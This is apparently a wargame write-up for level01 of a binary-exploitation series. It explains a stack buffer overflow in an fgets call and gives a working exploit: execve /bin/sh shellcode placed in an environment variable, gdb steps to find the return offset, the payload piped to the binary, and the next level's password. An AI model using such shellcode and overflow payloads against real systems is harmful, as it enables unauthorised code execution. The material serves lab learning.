## LEVEL 01
---
### For a better understanding of the levels and the solutions, I recommend you to read the [disassemble file](./asm/level01.asm) and the [source file](./src/level01.c). This README only contains the most important parts to solve the level.
---
### Security
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```

#### For this level, the NX security is disabled, so we can use the buffer overflow attack again. That's advantageous because we're going to need it.
---

We're going to apply the same automation techniques as we did in Rainfall. First, we need to find a vulnerability within the code. If we examine the `main` function, we find two interesting lines:
```c
char buffer[0x40];
[...]
fgets(buffer, 0x64, stdin);
```

The `fgets` function reads 100 characters from the standard input and stores them in the `buffer` variable. The problem is that the `buffer` variable is only 64 bytes long, so we can write 36 bytes after the end of the buffer. This is a vulnerability that we can exploit and it's really similar to what we used in rainfall.

The second thing I noticed is that the program never calls `system` so we have to use a Shellcode again. I will use a Shellcode inside the environment variable `SHELLCODE` to make it easier to use. I will also use the same Shellcode as in rainfall.

```shell
export SHELLCODE=$(python -c 'print "\x90"*64 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

Now we just need to find the EIP offset. I will also use the same technique as in rainfall.

```shell
(gdb) x/a $ebp+4
0xffffd70c:	0xf7e45513
(gdb) x/a $esp+0x1c
0xffffd6bc:	0x0
```

The EIP offset is `0xffffd70c - 0xffffd6bc = 0x50 <==> 80`. Now we can write the exploit.

The first thing I need to know is the address of the environment variable `SHELLCODE`.

```shell
(gdb) x/s *((char **)environ)
0xffffd889:	 "SHELLCODE=\220\220\220[...]
```

I will add 0x20 to the address to avoid conflicts with the environment variable name and to ensure that we are on the NOP offset. The final address will be `0xffffd8a9`.

Now we can exploit the binary. Unlike Rainfall, I won't put the Python result in a temporary file; instead, I will directly pipe it to the binary. It will be easier for me to use.

```shell
$ (python -c 'print "dat_wil"'; python -c 'print "\x90"*80 + "\xa9\xd8\xff\xff"'; cat -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```